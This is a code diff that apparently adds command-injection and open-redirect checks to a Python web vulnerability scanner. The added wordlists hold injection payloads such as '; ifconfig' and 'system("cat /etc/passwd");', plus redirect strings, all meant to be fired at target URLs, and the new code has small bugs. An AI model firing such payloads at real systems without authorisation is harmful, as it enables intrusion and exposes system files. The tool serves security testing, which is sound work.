@@ -1,7 +1,7 @@
 import mechanize
 from urllib import parse as urlparse
 import http.cookiejar
-from parametizer.params import parametizer
+from parametizer.params import parametizer, parametizer2
 from scanners.scan import xss, xss_params
 from scanners.scan import lfi, lfi_params
 from scanners.scan import sqli, sqli_params
@@ -11,6 +11,8 @@ from urllib.request import urlopen
 from urllib.error import URLError, HTTPError
 import random
 from scanners.scan_idor import idor
+from scanners.scan_rce import rce, rce_params
+from scanners.scan_redirect import redirect, redirect_params
 from scanners.scan_lfi import lfi, lfi_params
 from scanners.scan_ssrf import ssrf, ssrf_params
 from scanners.scan_ssti import ssti, ssti_params
@@ -47,7 +49,7 @@ br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
 br.addheaders = [('User-Agent', user_agent),
 ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]
 
-def all_list(l,c,cl,h,x,lf,s,i,sr,sst,output,fname,o,vulnerables_urls,op,params):   
+def all_list(l,c,cl,h,x,lf,s,i,r,rc,sr,sst,output,fname,o,vulnerables_urls,op,params):   
      
  for linea in l:
 
@@ -132,7 +134,7 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,sst,output,fname,o,vulnerables_urls,op,params)
              except: 
                   continue
      except:
-         continue
+         continue        
      try:    
          if s:
              uri=[]
@@ -176,6 +178,55 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,sst,output,fname,o,vulnerables_urls,op,params)
                   continue
      except:
         continue
+ 
+     try:    
+         if rc:
+             uri=[]
+             wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
+             '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");'
+             ]
+             parametizer(linea,output)
+             try:
+                 with open(output, "r") as f:
+                     for y in f.readlines():
+                         y = y.strip()
+                         if y == "" or v.startswith("#"):
+                             continue
+                         uri.append(y)
+                 if op:
+                     rce_params(uri,params)
+                 else:                                             
+                     print()        
+                     print('\033[1;33mTest rce for default payload:\033[0m')       
+                     rce(uri,wordlist,vulnerables_urls)           
+             except: 
+                  continue
+     except:
+         continue
+     try:    
+         if r:
+             uri=[]
+             wordlist=['////example.com/','////example.com/','https:///example.com/','/<>//example.com',
+        '/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com'
+        ,'/\/\/example.com/','/https:example.com']
+             parametizer(linea,output)
+             try:
+                 with open(output, "r") as f:
+                     for m in f.readlines():
+                         m = m.strip()
+                         if m == "" or m.startswith("#"):
+                             continue
+                         uri.append(m)
+                 if op:
+                     redirect_params(uri,params)
+                 else:                                             
+                     print()        
+                     print('\033[1;33mTest redirect for default payload:\033[0m')       
+                     redirect(uri,wordlist,vulnerables_urls)           
+             except: 
+                  continue
+     except:
+         continue                  
      try:    
          if sr:
              uri=[]
@@ -244,7 +295,8 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,sst,output,fname,o,vulnerables_urls,op,params)
              except: 
                   continue
      except:
-         continue                    
+         continue           
+      
      if o:
          save_output(vulnerables_urls,fname,linea)    
      if op:
